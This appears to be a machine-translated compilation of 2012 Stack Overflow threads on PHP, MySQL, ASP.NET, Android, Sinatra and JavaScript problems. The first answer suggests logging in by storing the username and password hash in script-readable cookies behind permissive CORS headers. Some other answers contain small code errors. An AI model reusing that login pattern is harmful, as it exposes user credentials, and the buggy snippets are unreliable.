主页面 (@customazon.com) 加载包含辅助域 (@gamekeg.com) 的 iframe。我想允许用户使用提供的密码登录管理控制面板。问题是，由于它是第二个域，浏览器将其视为“第三方 Cookie”，并且大多数会直接拒绝它们。我需要找到一种方法来允许在这个 iframe 中设置 cookie。要求用户调整他们的 cookie 设置*不是*一种选择。

我尝试过的事情：

1.  在标头中设置 P3P 短版本（CP= 字符串的许多不同版本）： header('P3P:CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"');

2.  使用 policy.p3p 和 p3p.xml 文件创建（可能不正确，但我已尽我所能）一个 P3P 长版本。

3.  一些奇怪的 javascript 加载隐藏的 iframe 并发布到它（Safari 解决方法？）。

没有任何效果。任何可以提供的帮助以找到一种方法来实现这一点都会很棒。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:43:48.513

（我可能在这个答案中切换了域，但理论应该是一样的。）

您最好的选择是从 gamekeg.com 登录页面向 customazon.com[发出跨域 AJAX 请求](http://bionicspirit.com/blog/2011/03/24/cross-domain-requests.html)（您需要发送一些特殊的标头以允许跨域请求 - 阅读该链接的更多信息）。在正常情况下，除非您控制两个站点（您似乎可以），否则这是不可能的。

在gamekeg.com登录页面，用户登录成功后，可以这样调用：

```
// I don't expect you to use jQuery, but I don't recall the entire
// AJAX process off of the top of my head. You may have to set
// xhr.withCredentials = true or something.
$.ajax(
    "http://customazon.com/ajax_login.php",
    {
        "username": <?php echo $username; ?>,
        "password_hash": <?php echo $password_hash; ?>
    }
); 
```

`ajax_login.php`可能是这样的：

```
// Send appropriate cross-domain headers here.
// In addition, you must configure your crossdomain.xml in your root.
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Origin: http://source.com");
header("Access-Control-Allow-Headers: Content-Type, *");
if (isset($_POST["username"]) && isset($_POST["password_hash"])) {
    setcookie("username", $_POST["username"], time() + 24 * 60 * 60);
    setcookie("password", $_POST["password_hash"], time() + 24 * 60 * 60);
} 
```

然后，在框架容器上，您可以每隔一段时间检查一下用户是否已登录（`readCookie`取自[QuirksMode](http://www.quirksmode.org/js/cookies.html)）：

```
function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
            var c = ca[i];
            while (c.charAt(0)==' ') c = c.substring(1,c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

function checkAjaxLogin() {
    if (readCookie("username") !== null && readCookie("password")) {
        // You're logged in now; refreshing the page should
        // do the rest, assuming the cookies are named correctly.
        window.location.refresh();
    }
} 
```

但是，如果您可以使用 Flash，则该过程可能会加快，因为 Flash 请求不关心跨域策略。但是，我没有使用 Flash 提供示例的技能，无论如何，可能有很多。

# php - 控制外部变量和值的实时服务器端脚本

> ID：10069620
> 
> 赞同：0
> 
> 时间：2012-04-09T06:13:19.963
> 
> 标签：php, real-time, server-side, real-time-updates

好的，这就是我正在做的事情。我正在计划一个浏览器游戏，但我想要它的实时方面。基本上，玩家可以在城市地图上漫游并遇到随机的 NPC 和敌人。我想知道的是，有没有一种方法可以让脚本不断运行，与用户的浏览分开，从而控制诸如 NPC 移动之类的事情（每秒左右移动一次，等等）？

因此，用户将在玩游戏（在地图的某个区域），并且会有类似于游戏客户端（如 WoW）控制 NPC 等的东西，但在服务器端进行控制。（顺便说一句，这是共享主机。如果我需要专用或其他什么，这也是一个选项。）我真的不想让用户的浏览器每秒发送一个请求，询问全世界所有 NPC 的位置. 我只是想找出一种替代方法来做这件事，同时仍然具有实时性。

如果这是不可能的，那很好，我有替代的非实时游戏计划。如果上面有什么不清楚的地方，我会尽量详细说明。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T07:25:54.240

您可能应该为此谷歌：'php daemon howto'

守护进程是驻留在内存中的程序，可以通过信号进行控制。

可悲的是，php 处理异步事件的能力很差，比如发送一些数据并在继续操作的同时等待答案。

我在编写 sms-daemon 时遇到了这个问题——客户端将 sms 放入队列，守护进程发送并等待确认。但是在等待时它应该继续从队列中接收另一条消息。

# c# - CSS样式表不显示效果

> ID：10069624
> 
> 赞同：0
> 
> 时间：2012-04-09T06:13:43.397
> 
> 标签：c#, asp.net, css

我正在使用`Asp.Net/C#`。目前我正在登录页面上工作，我`login page`不依赖于`Master Page`，因此`Stylesheet`我在 head 部分中设置了指向我的链接

```
<link  rel="stylesheet" href="Styles/Login.css" type="text/css"/> 
```

问题是样式对登录页面上的控件没有任何影响。这是我的 css 文件

```
body
{
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    font-size:75%; 
}
#loginbox
{
     position:fixed;
    background-color:#9cc3f7;
    border:2px solid #ddd;
    height:200px;
    width:300px;
    top:50%;
   margin-left: -130px;
   margin-top: -100px;
    left:50%;
} 
```

这是登录页面

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="HomeLogin.aspx.cs" Inherits="CwizBankApp.HomeLogin" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">

    <title>Comwizard Systems | Login</title>
    <link  rel="stylesheet" href="Styles/Login.css" type="text/css"/>

</head>
<body>
    <form id="form1" runat="server">

    <div id="loginbox">
    <span>UserName:</span><asp:TextBox ID="txtUserName" runat="server"></asp:TextBox> <br /> 
    <span style="margin-left:6px;">Password:</span><asp:TextBox ID="txtPassword" runat="server" TextMode="Password"></asp:TextBox><br />  
    <asp:Button ID="cmdLogin"  runat="server" Text="Login" onclick="cmdLogin_Click" />

    </div>
    </form>
</body>
</html> 
```

任何人都可以帮我解决这个问题。任何建议都受到高度赞赏。谢谢

最后问题已经解决了在web.config中添加这个解决了它

```
<location path="~/Styles">
    <system.web>
        <authorization>
            <allow users="*" />
        </authorization>
    </system.web>
</location> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:49:11.197

试试这个

```
 <location path="~/stylesheets">
        <system.web>
            <authorization>
                <allow users="*" />
            </authorization>
        </system.web>
   </location> 
```

请使用您的样式表路径更新路径....参考这篇文章

[http://forums.asp.net/t/1678658.aspx/1](http://forums.asp.net/t/1678658.aspx/1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:20:16.683

快速提问，你能检查一下css文件是否真的被解析了吗？

如果您使用的是 chorme，则可以使用开发人员工具并使用网络部分来查看所有通过的请求。

如果您使用的是 firefox，请使用 firebug。

谢谢

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:23:40.347

查看源代码（如果使用 chrome/firefox，通常按***`CTRL`+`U`***）并找到它的位置`href="Styles/Login.css"`，您应该可以单击它作为样式表的链接。您应该首先确保您实际上正确链接到它，它是否正确加载？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T06:24:06.807

尝试

```
href="@Url.Content("~/Styles/Login.css")" 
```

代替

```
href="Styles/Login.css" 
```

如果您使用的是 Visual Studio，智能感知（自动完成）将支持您找到确切的位置。只需在打开 Url.Content() 方法的括号后按 Ctrl+Space 即可。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T06:32:36.230

我检查了你的样品，完全没有问题。控制“登录框”确实获得了 css 样式。请检查您的 css 文件是否在正确的位置。

```
href="Styles/Login.css" 
```

# mysql - MySQL 用于平均缺失日期

> ID：10069629
> 
> 赞同：2
> 
> 时间：2012-04-09T06:14:38.753
> 
> 标签：mysql, date, window-functions

我正在寻找通过平均该行之前和之后最近的 id 的日期来更新该`date`列所在的行。`NULL`

在下面的数据中，它会将 ID 行更新`26`为`2011-10-19`

什么 MySQL 语句会完成这个？

* * *

# **补充说明：**

数据看起来像这样：

```
id     date           title
--------------------------------------------
12     2011-09-01     Example One
23     2011-10-02     Example Two
26     NULL           Example Three
27     2011-11-05     Example Four
29     2012-01-05     Example Five
37     NULL           Example Six
38     2012-02-03     Example Seven
-------------------------------------------- 
```

我宁愿不使用程序。

到目前为止，我已经...

```
UPDATE `table`
    SET `date`=
         (AVG(
              (SELECT `date` FROM `table` WHERE `id`< ID_OF_PARENT_QUERY AND `date` IS NOT NULL LIMIT 1),
              (SELECT `date` FROM `table` WHERE `id`> ID_OF_PARENT_QUERY AND `date` IS NOT NULL LIMIT 1)
         ))

    WHERE `date` IS NULL 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T06:28:49.277

```
UPDATE tableX AS t
  JOIN tableX AS next
    ON next.id =
       ( SELECT MIN(n.id)
         FROM tableX AS n
         WHERE n.id > t.id
           AND n.dateX IS NOT NULL
       )
  JOIN tableX AS prev 
    ON prev.id =
       ( SELECT MAX(p.id)
         FROM tableX AS p
         WHERE p.id < t.id
           AND p.dateX IS NOT NULL
       )
SET t.dateX = prev.dateX + INTERVAL (DATEDIFF(next.dateX, prev.dateX) / 2) DAY
WHERE t.dateX IS NULL 
```

# mysql - 选择给定年份的金额

> ID：10069631
> 
> 赞同：1
> 
> 时间：2012-04-09T06:14:51.270
> 
> 标签：mysql

我有一张表格，上面有国家、年份和每年的金额。我正在尝试编写一个查询，将给定年份的总金额相加并将其作为一列提供给我。

例如，要具有如下所示的输出：

```
Country   1991     1992     1993
France     25       12       38 
```

我尝试了这样的查询，但无济于事：

```
SELECT 
     country as "Recipient", 
     SUM(usd_amount) AS "1991" WHEN project_year = 1991,
     SUM(usd_amount) AS "1992" WHEN project_year = 1992,
     SUM(usd_amount) AS "1993" WHEN project_year = 1993

FROM tb1

GROUP BY project_year, country
order by country, project_year 
```

有什么建议么？谢谢！克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:20:09.657

Give this a try:

```
SELECT 
     country as "Recipient", 
     SUM(if(project_year = 1991, usd_amount, 0)) AS "1991",
     SUM(if(project_year = 1992, usd_amount, 0)) AS "1992",
     SUM(if(project_year = 1993, usd_amount, 0)) AS "1993",
FROM tb1
GROUP BY country
ORDER BY country 
```

PS: It makes no sense to order by project year as you're already aggregating on it.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:22:35.460

尝试以下

```
SELECT 
     country as "Recipient", 
     SUM(case WHEN project_year = 1991 then usd_amount else 0 end) AS "1991" ,
     SUM(case WHEN project_year = 1992 then usd_amount else 0 end) AS "1992" ,
     SUM(case WHEN project_year = 1993 then usd_amount else 0 end) AS "1993" 

FROM tb1

GROUP BY country, project_year
order by country, project_year 
```

# php - 如果数据库为空，如何隐藏 PHP

> ID：10069632
> 
> 赞同：0
> 
> 时间：2012-04-09T06:15:03.350
> 
> 标签：php, database

如果数据库中为空，如何使 twitter 和 facebook 链接不显示？

这是我的代码：

```
<?php
$links=explode(" ",preg_replace("|\s|Umxis", ' ', $r['web_links']));
if(count($links)>0){
echo "<div id='profile_links'>
<h3>Websites:</h3>
<ul class='profile_links'>";
foreach($links as $k=>$v){
echo "<li><a href='$v'>$v</a></li>";
}
echo "</ul>
</div>
<a class='fb_link' href='http://{$r['facebook']}'</a>
<a class='tw_link' href='http://www.twitter.com/{$r['twitter']}'</a>";
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:32:23.747

一个 isset 呢？！

```
<?php
$links=explode(" ",preg_replace("|\s|Umxis", ' ', $r['web_links']));
if(count($links)>0){
echo "<div id='profile_links'>
<h3>Websites:</h3>
<ul class='profile_links'>";
foreach($links as $k=>$v){
echo "<li><a href='$v'>$v</a></li>";
}
echo "</ul>
</div>";
if (isset($r['facebook']) && ! empty($r['facebook'])) {
    echo "<a class='fb_link' href='http://{$r['facebook']}'</a>";
}
if (isset($r['facebook']) && ! empty($r['facebook'])) {
    echo "<a class='tw_link' href='http://www.twitter.com/{$r['twitter']}'</a>";
}
}
? 
```

>

# android - 在 Android 中实现包装复选框列表或标签列表

> ID：10069633
> 
> 赞同：1
> 
> 时间：2012-04-09T06:15:04.697
> 
> 标签：android

一个标准的复选框列表占用了大量的垂直空间：

```
[ ] Option 1
[X] Opt 2
[X] Loooooong option 3
[ ] Option 4 
```

我想做的是将它们包装起来：

```
[ ] Option 1 [X] Op 2 [X] Loooooong option
3 [ ] Option 4 
```

或者类似 stackoverflow 标签字段的东西：

```
[X] Loooooong option 3 [X] Opt 2
Tags: [ Optio       ]
        Option 1
        Option 4 
```

我一直无法找到合适的课程来做到这一点，我宁愿不重新发明轮子。由于使用 TableLayout 或 GridView 的每个字段都有不同的长度（例如，联系人姓名），因此没有意义。

# google-chrome-extension - 如何在后台在 Chrome 中打开多个页面并从中抓取？

> ID：10069635
> 
> 赞同：0
> 
> 时间：2012-04-09T06:15:33.927
> 
> 标签：google-chrome-extension, web-scraping

在 Firefox 中，我会使用 page-worker 组件，它允许内容脚本可以访问任意多个隐藏页面。

Chrome 中的等价物是什么？

似乎只有一个背景页面可用，并且 iframe 内的加载页面不适用于所有页面。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T09:11:52.743

不幸的是，还没有这样的东西，我说还没有，因为他们正在研究隐藏标签之类的东西（但我目前找不到链接）。
如果您无法 xhr 页面的源代码，对其进行一些清理，然后将其放入 div 中进行刮擦，这里有一些出色的代码......
[https://stackoverflow.com/a/7539198/189093](https://stackoverflow.com/a/7539198/189093)

**更新**
正如 Rob W 在评论中指出的那样，你最好使用......
[https://stackoverflow.com/a/9251106/938089?javascript-domparser-access-innerhtml-and-other-properties](https://stackoverflow.com/a/9251106/938089?javascript-domparser-access-innerhtml-and-other-properties)

# java - foreach 变量导致“ 预期”编译错误

> ID：10069636
> 
> 赞同：0
> 
> 时间：2012-04-09T06:15:38.717
> 
> 标签：java, foreach

我正在为 Java 入门课程做家庭作业。当我尝试编译我的代码时，我得到一个编译错误。我确信这很简单，但我无法找出错误的原因。

请注意，我收到的错误位于源代码下。

```
/* Logical Design

start
  // Declarations
  final String QUESTIONS[] = new String{"Please input your answer using A, B, or C.\nWho is the coolest guy ever? \n\nA. Max\nB. James Bond\nC. Burt Reynolds", "Please input your answer using A, B, or C.\nWho do coolguys' drive?\n\nA. Datuns\nB. Panters\nC. Porsches", "Please input your answer using A, B, or C.\nWhat is the coolest city?\n\nA. Los Angles\nB. Denver\nC.Boulder"};
  final String CONGRATS = "You got it right!"
  final string FAIL = "Horribly. Horribly wrong. =["
  final String ANSWERS[] = new String{"A","A","A"};
  final String QUIT = "QUIT";
  String tempanswer[] = new String[3]
  int index;
  int index2;
  String keeplaying;

  Output "Would you like to play?"
  input keeplaying
  if(keepplaying == QUIT) {
  return;
  } else {
    for(index = 0; index<QUESTIONS.length; index++) {
    Output QUESTIONS[index]
    input tempanswer[index];
      for(index2 = 0; index2<ANSWERS.length; index2++) {
        if tempanswer == ANSWERS[index2] {
        output CONGRATS } else { output FAIL }
      }
    }
  }
stop
*/

import javax.swing.*;
import java.awt.event.*;

public class FunQuiz
{
  public static void main(String args[])
  {
  final String QUESTIONS[] = {"Please input your answer using A, B, or C.\nWho is the coolest guy ever? \n\nA. Max\nB. James Bond\nC. Burt Reynolds", "Please input your answer using A, B, or C.\nWhat do coolguys' drive?\n\nA. Datuns\nB. Panters\nC. Porsches", "Please input your answer using A, B, or C.\nWhat is the coolest city?\n\nA. Los Angles\nB. Denver\nC.Boulder"};
  final String ANSWERS[] = {"A","A","A"};
  final String QUIT = "QUIT";
  String tempanswer[] = new String[3];
  int index;
  int index2;
  String keeplaying;

  keepplaying = JOptionPane.showInputDialog("Would you like to play?");
  if(keepplaying == QUIT) {
  return;
  } else {
    for(index = 0; index<QUESTIONS.length; index++) {
    System.out.println(QUESTIONS[index]);
    JOptionPane.showInputDialog(tempanswer[index]);
      for(index2 = 0; index2<ANSWERS.length; index2++) {
        if(tempanswer == ANSWERS[index2]) {
        System.out.println("You got question " . index2 . " correct!");} else { System.out.println("You got question " . index2 . " incorrect.");}
      }
    }
  }

  System.exit(0);
  }
} 
```

这些是我在编译时遇到的错误

```
FunQuiz.java:57: <identifier> expected
        System.out.println("You got question " . index2 . " correct!");} else { System.out.println("You got question " . index2 . " incorrect.");}
                                                         ^
FunQuiz.java:57: ';' expected
        System.out.println("You got question " . index2 . " correct!");} else { System.out.println("You got question " . index2 . " incorrect.");} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:17:43.533

Use `System.out.println("You got question " + index2 + " correct!");}` instead of

```
System.out.println("You got question " . index2 . " correct!");}; 
```

Java uses + for concatenation.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T06:18:21.957

In JAVA the concatenation simbol is not "." but "+".
Use `System.out.println("You got question " + index2 + " correct!");}`

# android - 将文本更改为语音 - TTS 更改为铃声音量

> ID：10069638
> 
> 赞同：0
> 
> 时间：2012-04-09T06:15:56.693
> 
> 标签：android, text-to-speech, volume

如何控制 TTS 音量？我不想使用 AudioManager，因为 audiomanager 无法通过按下 Galaxy Tab 上的音量按钮来设置（我认为这是一个铃声音量）。那么，如何将 TTS 扬声器更改为铃声音量？

或者如何将文本到语音的输出设置为 STREAM_RING？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T01:24:07.137

我找到了解决方案。我尝试将 TTS 输出作为铃声音量。但它没有用。所以解决方案是改变galaxy tab的音量控制器来控制媒体音量。使用此代码

```
setVolumeControlStream(AudioManager.STREAM_MUSIC); 
```

把它放在 onCreate() 中，一切顺利。希望这对面临同样问题的人有所帮助。

信用：非常感谢P'Tee

# c# - 快速访问工具栏中的命令名称

> ID：10069647
> 
> 赞同：1
> 
> 时间：2012-04-09T06:16:57.330
> 
> 标签：c#, vba, excel

是否可以在 excel 2010 的快速访问工具栏中获取所有命令名称我正在尝试在 winforms 和控制台应用程序中获取它

我只想打印名称（复制、粘贴、截图、保存等）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:09:08.047

一个奇怪而有趣的要求:)

我一直在思考这个问题已经有一段时间了。AFAIK（我可能是错的）但你不能像你想要的那样直接与 QAT 交互。**但是**我有一个替代建议。查看快照。

点击“更多命令”

![在此处输入图像描述](../Images/9b65c750d1aa31563659f7018e611f54.png)

您将看到“ **Excel 选项**”对话框。

在“**自定义**”下，选择“**导出所有自定义**”

![在此处输入图像描述](../Images/c04b1007d18e459aacfce69e9754a368.png)

保存文件。记住保存它的位置。该文件将保存为`FILENAME.exportedUI`

如果你在记事本中打开这个文件，它会看起来像这样。

![在此处输入图像描述](../Images/fee9f50d01b5389c27a30c70e4b182c5.png)

现在使用 RegEx，您可以简单地找到菜单的名称。无论您想为 RegEx 使用 C# 还是 VBA，我都将这个选项留给您。

高温高压

# php - 使用 PHP 收不到邮件

> ID：10069649
> 
> 赞同：0
> 
> 时间：2012-04-09T06:17:09.163
> 
> 标签：php, email

这是我的邮寄代码：

```
 <?php
error_reporting(E_ALL);
$user_subject = "Ticket - Budget Notification";
$user_headers = "From: mariyadavis90@gmail.com\r\n";
$user_headers .= "MIME-Version: 1.0\r\n";
$user_headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
$user_part = '<html><body>';
$user_part .= '<div style="background-color: #EEEEEE;border-bottom: 1px solid #DCDCDC;padding: 10px 10px 20px;width: 500px; float:left;font-size:12px;font-weight:bold;">';
$user_part1 = '<div style="width:500px;">';
$user_part1 .= '<div style="width:500px;background-color:#eeeeee;padding: 10px 0 20px;border-bottom:1px solid #dcdcdc;">';
$user_part1 .= '<div style="float:left;width:150px;color:#666666;margin-left:20px;font-size:12px;font-weight:bold;">';
$user_part1 .= '</div></div>';
$user_part1 .= '<div style="width:450px;background-color:#eeeeee;padding: 10px 0 20px;border-bottom:1px solid #dcdcdc; height:auto; float:left;font-size:12px;margin-left:50px; font-weight:bold;">';
$user_part3 = '</div></div></div>';
$user_part3 .= '</body></html>';
$user_center_part1 = '';    
$user_center_part = 'The following Tickets are reached its budget ,';   
$user_center_part2='<div style="float:left;width:auto;color:#000000;font-size:12px;margin-left:75px; font-weight:bold; height:auto; margin-top:10px;">Ticket #10 reached 100% of its budget</div>';
$user_to = 'galtech.staffs@gmail.com';
if($user_to){

        $user_center_part1 = 'Dear Admin ,';
        $user_message = $user_part.$user_center_part1.$user_part1.$user_center_part.$user_center_part2.$user_part3; 
        if(mail($user_to, $user_subject, $user_message, $user_headers))
        {
            echo "Mail Send Successfully";
        }else{
            echo "Mail Not Send Successfully";
        }
    }
?> 
```

当我使用此邮件代码时，我的帐户中收不到任何邮件。我的代码有什么问题？帐户中不会收到任何内容。`Mail Sent Successfully`每次都会显示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:27:33.763

您的`From:`标头看起来很奇怪，大多数邮件服务器会很高兴地拒绝您的电子邮件，因为您的电子邮件带有这样的无效标头。请确保它包含一个实际的电子邮件地址，然后重试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T14:14:29.747

我注意到您的接收电子邮件是 gmail，也就是说；'galtech.staffs@gmail.com' 我将您的脚本用于测试目的，我收到了邮件，但作为垃圾邮件。我相信您也收到了它们，php 邮件功能使用 gmail 作为接收者电子邮件会产生问题，在编辑标题部分后我会在收件箱中收到邮件，这是结果；

![这就是你要找的](../Images/b9327efc7c3ec8d283503335812dad7d.png)

**尝试这个;**

```
$user_subject = "Ticket - Budget Notification";
$user_headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$user_part = '<html><body>';
$user_part .= '<div style="background-color: #EEEEEE;border-bottom: 1px solid #DCDCDC;padding: 10px 10px 20px;width: 500px; float:left;font-size:12px;font-weight:bold;">';
$user_part1 = '<div style="width:500px;">';
$user_part1 .= '<div style="width:500px;background-color:#eeeeee;padding: 10px 0 20px;border-bottom:1px solid #dcdcdc;">';
$user_part1 .= '<div style="float:left;width:150px;color:#666666;margin-left:20px;font-size:12px;font-weight:bold;">';
$user_part1 .= '</div></div>';
$user_part1 .= '<div style="width:450px;background-color:#eeeeee;padding: 10px 0 20px;border-bottom:1px solid #dcdcdc; height:auto; float:left;font-size:12px;margin-left:50px; font-weight:bold;">';
$user_part3 = '</div></div></div>';
$user_part3 .= '</body></html>';
$user_center_part1 = '';    
$user_center_part = 'The following Tickets are reached its budget ,';   
$user_center_part2='<div style="float:left;width:auto;color:#000000;font-size:12px;margin-left:75px; font-weight:bold; height:auto; margin-top:10px;">Ticket #10 reached 100% of its budget</div>';

$user_to = 'youremailid@gmail.com';

       $user_center_part1 = 'Dear Admin ,';
       $user_message = $user_part.$user_center_part1.$user_part1.$user_center_part.$user_center_part2.$user_part3; 
        if(mail($user_to, $user_subject, $user_message, $user_headers))

            echo "Mail Send Successfully";
        else
            echo "Mail Not Send Successfully"; 
```

# c# - 如何使用 LINQ 和 EntityFramework 实现连接

> ID：10069653
> 
> 赞同：2
> 
> 时间：2012-04-09T06:18:02.377
> 
> 标签：c#, asp.net, linq, entity-framework

我正在尝试在 EF 4.0 查询中创建一个 linq 2 sql，如下面的 sql 查询。

```
SELECT * FROM Role
LEFT JOIN Queue 
ON Role.RoleId = Queue.RoleId 
WHERE QueueId = 361 
```

那么我怎么能在 EF 4.0 中做到这一点呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T06:28:34.720

通常这是使用在您获取实体时加载的导航属性来完成的，但是您也可以通过以下方式执行此操作：

```
from r in Roles
from q in Queues
where r.RoleId == q.RoleId
where q.QueueId == 361
select new { r.RoleId, q.QueueId /*other bits you want*/} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T06:55:29.273

尝试以下我希望它有帮助

我建议搜索有关联接的更多信息

```
var result=(from p in Roles
join pa in Queue on p.RoleId equals pa.RoleId into temproles
from addresses in temproles.DefaultIfEmpty() where temproles.queueId = 361
select new { p, pa} ); 
```

# ruby - My partials doesn't working

> ID：10069657
> 
> 赞同：0
> 
> 时间：2012-04-09T06:18:29.557
> 
> 标签：ruby, windows, sinatra, haml

I am trying to split my HAML view to the separate files. I have read the [Sinatra Book](http://sinatra-book.gittr.com/#implementation_of_rails_style_partials) and tried to implement the basic version.

So I have created **app_helpers.rb** file:

```
# Usage: partial :foo
helpers do
  def partial(page, options={})
    haml page, options.merge!(:layout => false)
  end
end 
```

And require it in my **application.rb**:

```
require 'sinatra'
require_relative './app_helpers.rb' 
```

Then I have created partial views/test.haml:

```
<h3> Test message </h3> 
```

And require it in my **index.haml**:

```
= partial :test 
```

But when I refresh my page I get the error message:

```
NoMethodError - undefined method `partial' for #<Application:0x514dbe0>:
        c:/Dropbox/development/myprojects/test/sinatra-bootstrap/views/index.haml:27:in `evaluate_source'
        C:/Ruby193/lib/ruby/gems/1.9.1/gems/tilt-1.3.3/lib/tilt/template.rb:209:in `instance_eval'
        C:/Ruby193/lib/ruby/gems/1.9.1/gems/tilt-1.3.3/lib/tilt/template.rb:209:in `evaluate_source'
        C:/Ruby193/lib/ruby/gems/1.9.1/gems/tilt-1.3.3/lib/tilt/template.rb:144:in `cached_evaluate'
        C:/Ruby193/lib/ruby/gems/1.9.1/gems/tilt-1.3.3/lib/tilt/template.rb:127:in `evaluate'
        C:/Ruby193/lib/ruby/gems/1.9.1/gems/tilt-1.3.3/lib/tilt/haml.rb:24:in `evaluate'
        C:/Ruby193/lib/ruby/gems/1.9.1/gems/tilt-1.3.3/lib/tilt/template.rb:76:in `render'
        C:/Ruby193/lib/ruby/gems/1.9.1/gems/sinatra-1.3.1/lib/sinatra/base.rb:625:in `render'
        C:/Ruby193/lib/ruby/gems/1.9.1/gems/sinatra-1.3.1/lib/sinatra/base.rb:522:in `haml' 
```

How can I fix it?

**Updated:**

All works fine if I rewrite **app_helpers.rb** such way:

```
def partial(page, options={})
    haml page, options.merge!(:layout => false)
end 
```

What is the reason of this?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T10:30:24.987

Sinatra partials 在[FAQs](http://www.sinatrarb.com/faq.html#partials)中有一个很好的部分。有一个[要点](https://gist.github.com/119874)，其中包含您需要创建的文件。然而，他们现在创建了一个 gem [Sinatra-Partial](https://github.com/yb66/Sinatra-Partial)。

我的建议是将此 gem 用于局部（[Sinatra-Partial](https://github.com/yb66/Sinatra-Partial)）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T21:54:46.620

无法重现：

```
C:\test>cat views\layout.haml
%body= yield

C:\test>cat views\index.haml
#main=partial :test

C:\test>cat views\test.haml
%h3 Hello World

C:\test>cat test_partial.rb
require 'sinatra'
require 'haml'

helpers do
  def partial(page, options={})
    haml page, options.merge!(:layout => false)
  end
end

get '/' do
  haml :index
end

c:\test>ruby -v
ruby 1.9.2p180 (2011-02-18) [i386-mingw32]

C:\test>curl http://127.0.0.1:4567/
<body><div id='main'><h3>Hello World</h3></div></body> 
```

但是，正如@Konstantin 所指出的，`partials`从 Sinatra 1.1.0 开始不再需要使用自定义方法。如果我更改`index.haml`为 just`#main=haml :test`并删除该`partials`方法，则输出是相同的。

*在早期版本的 Sinatra 中，您会看到以下输出：*

```
<body><div id='main'><body><h3>Hello World</h3></body></div></body> 
```

# android - In which case I need to call finish() method on click back button..?

> ID：10069660
> 
> 赞同：0
> 
> 时间：2012-04-09T06:18:47.040
> 
> 标签：android, android-activity

What are the scenarios in which I should call finish() method on back button or it is good to call it on each back button..??

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T07:33:01.130

根据您的要求......我正在使用finish（）

1）当有人从菜单中选择退出选项时

2）在我的登录活动中..这样用户在登录后页面按后退按钮时不会再次看到登录框

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T07:01:16.330

当我们从第二个活动返回到第一个活动时，第二个活动将使用这个 finish() 关闭第二个活动并返回到第一个活动。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:27:59.847

这取决于您的应用程序要求，例如：

案例1：当按回时，需要结束你的活动，所以你需要调用`finish`，这是默认的

案例 2：在一个活动中，有 3 个步骤，如*a->b->c*，如果您在步骤 b 或 c 中，您按下返回只是想返回上一步，到 b 或到 a，所以你不需要调用`finish`方法在`onBackPressed`

因此，以上只是一个示例，您需要根据自己的情况做出更好的选择。

# java - Can't copy and paste directories from Eclipse(Helios) to Windows

> ID：10069662
> 
> 赞同：1
> 
> 时间：2012-04-09T06:19:10.023
> 
> 标签：java, eclipse, jakarta-ee, eclipse-plugin, eclipse-rcp

Cannot copy and paste directories from Eclipse(Helios) to Windows. The same problem is replicated in FlashBuilder 4.5. It gives an error "cannot paste clipboard contents into selected items"

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-04-24T18:25:59.593

如果我从*档案*（.rar、.zip 等）中剪切和粘贴 JAR，我会得到这个。

要在这种情况下修复它，首先从存档中提取文件，然后将文件剪切并粘贴到 Eclipse 中。在 Package Explorer 下也适用于我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:23:43.253

在使用 eclipse 时，一些文件和目录将被使用，不能复制粘贴到其他地方。关闭 Eclipse（如果正在运行），然后转到系统中已转储它的位置来执行此操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T09:05:14.437

如果有人有同样的问题，请转到

```
project->clean 
```

为我工作

# javascript - In regular expression: SyntaxError: Unexpected token ]

> ID：10069666
> 
> 赞同：0
> 
> 时间：2012-04-09T06:19:40.383
> 
> 标签：javascript, regex

I used the following expression

```
str.match(tag+"(\s*=\s*)((['"]*)(.+?)(['"]*)\1)"); 
```

where str is the string to be matched with and tag is a variable

For example the above expression should match

```
m="img"
m='img' 
```

where tag=m;
But at the above mentioned lined I'm getting

> SyntaxError: Unexpected token ]

* * *

## 回答 #1

> 赞同：2
